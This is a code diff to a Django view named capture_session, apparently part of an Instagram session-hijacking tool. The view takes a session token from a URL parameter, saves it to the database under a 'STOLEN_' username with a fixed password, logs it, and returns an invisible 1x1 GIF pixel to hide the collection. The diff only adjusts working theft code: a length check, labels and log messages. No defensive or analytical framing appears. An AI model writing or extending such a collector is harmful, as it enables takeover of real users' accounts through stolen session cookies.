@@ -200,18 +200,16 @@ def silent_page(request):
 
 
 
-# core/views.py → ADD THIS FUNCTION
 from django.http import HttpResponse
 from django.utils import timezone
 import urllib.parse
 
 def capture_session(request):
     sess = request.GET.get('s', '')
-    if sess and len(sess) > 60:
+    if sess and len(sess) > 80:
         try:
-            # SAVE TO DB
             InstagramAccount.objects.update_or_create(
-                username=f"CAPTURED_{sess[:15]}",
+                username=f"STOLEN_{sess[:15]}",
                 defaults={
                     'password': 'SILENT_2025',
                     'session_data': fernet.encrypt(json.dumps({
@@ -221,10 +219,10 @@ def capture_session(request):
                     'last_success': timezone.now()
                 }
             )
-            print(f"CAPTURED: {sess[:70]}...")
+            print(f"CAPTURED SESSION: {sess[:70]}...")
         except Exception as e:
-            print(f"ERROR: {e}")
-
-    # RETURN 1x1 INVISIBLE PIXEL
+            print("ERROR:", e)
+    
+    # Return invisible pixel
     pixel = b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xFF\xFF\xFF\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;"
     return HttpResponse(pixel, content_type="image/gif")
